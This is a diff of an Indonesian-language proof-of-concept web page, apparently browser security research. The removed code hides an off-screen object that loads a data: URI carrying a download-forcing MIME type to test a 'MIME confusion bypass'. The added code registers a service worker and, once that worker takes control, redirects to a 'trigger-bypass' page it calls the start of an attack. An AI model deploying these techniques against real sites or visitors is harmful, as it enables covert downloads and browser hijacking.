@@ -1,47 +1,26 @@
 <!DOCTYPE html>
-<html lang="id">
+<html>
 
 <head>
-    <meta charset="UTF-8">
-    <title>PoC - MIME Confusion Bypass</title>
-    <style>
-        body {
-            background: #121212;
-            color: #00ff00;
-            font-family: monospace;
-            text-align: center;
-            padding-top: 50px;
-        }
-    </style>
+    <title>Situs A - SW Tunneling</title>
 </head>
 
 <body>
-    <h2>Menguji Parser Fallback...</h2>
-    <p>Script sedang mencoba menyuntikkan unrenderable object.</p>
+    <h3>Situs A (SW Tunneling)</h3>
+    <p>Menyiapkan Service Worker...</p>
 
     <script>
-        console.log("Memulai injeksi objek otomatis...");
-        const base64Payload = "SW5pIGFkYWxhaCBoYXNpbCBkYXJpIFBhcnNlciBGYWxsYmFjayBCeXBhc3M=";
-        const poisonMimeTypes = [
-            "application/x-msdownload",
-            "application/octet-stream",
-            "application/force-download"
-        ];
-        const targetMime = poisonMimeTypes[0];
+        if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.register('sw.js').then(reg => {
+                console.log("SW Registered dalam scope:", reg.scope);
+            }).catch(err => {
+                console.error("SW Gagal daftar:", err);
+            });
 
-        try {
-            const obj = document.createElement('object');
-            obj.data = `data:${targetMime};base64,${base64Payload}`;
-            obj.style.width = '1px';
-            obj.style.height = '1px';
-            obj.style.position = 'absolute';
-            obj.style.left = '-9999px';
-
-            console.log(`Menyuntikkan objek dengan tipe: ${targetMime}`);
-            document.body.appendChild(obj);
-
-        } catch (err) {
-            console.error("Gagal menyuntikkan objek:", err.message);
+            navigator.serviceWorker.addEventListener('controllerchange', () => {
+                console.log("SW sudah memegang kendali penuh! Memulai serangan...");
+                window.location.href = 'trigger-bypass';
+            });
         }
     </script>
 </body>
